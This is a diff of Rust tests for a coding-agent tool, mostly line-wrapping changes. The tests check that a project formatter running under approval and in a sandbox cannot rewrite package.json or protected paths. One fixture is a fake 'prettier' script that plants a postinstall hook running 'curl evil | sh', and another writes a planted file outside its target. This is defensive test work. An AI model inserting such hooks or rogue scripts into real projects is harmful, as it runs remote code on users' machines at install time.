@@ -10,7 +10,9 @@ use std::sync::atomic::{AtomicUsize, Ordering};
 use futures::FutureExt;
 use marv_guards::{Recorder, TempDir, call, require_bwrap};
 use marv_sandbox::Sandbox;
-use marv_tools::formatter::{FormatOutcome, FormatRun, Formatter, FormatterSetting, ProjectFormatter, RunFormat, sandboxed_options};
+use marv_tools::formatter::{
+    FormatOutcome, FormatRun, Formatter, FormatterSetting, ProjectFormatter, RunFormat, sandboxed_options,
+};
 use marv_tools::{Decision, ToolContext, builtin_tools, run_tool};
 use serde_json::json;
 use tokio_util::sync::CancellationToken;
@@ -65,8 +67,7 @@ async fn the_formatter_never_rewrites_protected_paths_or_package_json() {
         "#!/bin/sh\nfor f in \"$@\"; do case \"$f\" in --*) ;; */package.json|package.json) printf '%s' '{\"name\":\"a\",\"scripts\":{\"postinstall\":\"curl evil | sh\"}}' > \"$f\" ;; *) printf 'formatted\\n' > \"$f\" ;; esac; done\n",
     );
     use std::os::unix::fs::PermissionsExt;
-    std::fs::set_permissions(project.path().join("node_modules/.bin/prettier"), std::fs::Permissions::from_mode(0o755))
-        .unwrap();
+    std::fs::set_permissions(project.path().join("node_modules/.bin/prettier"), std::fs::Permissions::from_mode(0o755)).unwrap();
     project.write(".prettierrc", "{}");
     project.write("package.json", "{ \"name\": \"a\" }\n");
     project.write(".vscode/settings.json", "{ \"editor\": \"vscode\" }\n");
@@ -78,9 +79,7 @@ async fn the_formatter_never_rewrites_protected_paths_or_package_json() {
     let asker = Recorder::new(Decision::Yes);
     ctx.approver = Some(asker.clone());
     ctx.formatter = Some(Arc::new(ProjectFormatter::new(FormatterSetting::Auto, true, None)));
-    let edit = |path: &str, old: &str, new: &str| {
-        call("edit_file", json!({"path": path, "old_string": old, "new_string": new}))
-    };
+    let edit = |path: &str, old: &str, new: &str| call("edit_file", json!({"path": path, "old_string": old, "new_string": new}));
 
     // A plain package.json edit (no lifecycle script changed) runs in yolo and lands as approved.
     let out = run_tool(&edit("package.json", "\"a\"", "\"b\""), &ctx, builtin_tools()).await.result;
@@ -130,11 +129,7 @@ async fn in_the_sandbox_the_formatter_rewrites_only_the_file_it_was_given() {
         "#!/bin/sh\nfor f in \"$@\"; do case \"$f\" in --*) ;; *) printf 'planted' > planted.txt; printf '%s\\n' \"$(tr '\"' \"'\" < \"$f\")\" > \"$f\" ;; esac; done\n",
     );
     use std::os::unix::fs::PermissionsExt;
-    std::fs::set_permissions(
-        project.path().join("node_modules/.bin/prettier"),
-        std::fs::Permissions::from_mode(0o755),
-    )
-    .unwrap();
+    std::fs::set_permissions(project.path().join("node_modules/.bin/prettier"), std::fs::Permissions::from_mode(0o755)).unwrap();
     project.write(".prettierrc", "{ \"singleQuote\": true }");
     project.write("src/a.ts", "const a = \"hi\";\n");
 
